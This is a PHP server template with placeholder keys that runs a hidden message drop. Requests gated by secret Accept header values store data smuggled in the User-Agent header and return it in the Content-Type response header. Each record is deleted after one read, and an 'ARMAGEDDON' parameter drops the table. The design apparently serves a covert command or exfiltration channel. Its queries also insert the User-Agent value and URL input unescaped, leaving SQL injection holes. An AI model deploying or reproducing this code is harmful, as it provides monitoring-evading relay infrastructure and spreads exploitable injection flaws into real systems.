<?php
$postKey="{{postKey}}";$getKey="{{getKey}}";$table="{{table}}";
$tableBegin={{tableBegin}};$tableID="{{tableID}}";

require_once 'config.php';
$conn = connect_database();
$tableQuery = "CREATE TABLE IF NOT EXISTS $table (
  $tableID BIGINT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
  $table VARCHAR(1000) NOT NULL);";
$tableAlter = "ALTER TABLE $table AUTO_INCREMENT=$tableBegin;";
$conn->query($tableQuery);
$conn->query($tableAlter);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['HTTP_ACCEPT'] == $postKey) {
  if(isset($_SERVER['HTTP_USER_AGENT'])){
    $postData = $_SERVER['HTTP_USER_AGENT'];
    $postQuery = "INSERT INTO $table ($table) VALUES ('$postData');";
    $conn->query($postQuery);
  }
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_SERVER['HTTP_ACCEPT'] == $getKey) {
  if(isset($_GET['ARMAGEDDON']) && $_GET['ARMAGEDDON'] == "{{armageddonKey}}"){
    $armageddonQuery = "DROP TABLE $table";
    $conn->query($armageddonQuery);
  }
  if(isset($_GET[$tableID])){
    $getQuery = "SELECT $table FROM $table WHERE $tableID = '$_GET[$tableID]'";
    $getResult = $conn->query($getQuery);
    $getRow = $getResult->fetch_assoc();
    header("Content-Type: " . $getRow[$table]);

    $deleteRow = "DELETE FROM $table WHERE $tableID = '$_GET[$tableID]'";
    $conn->query($deleteRow);
  }
}
$conn->close();
?>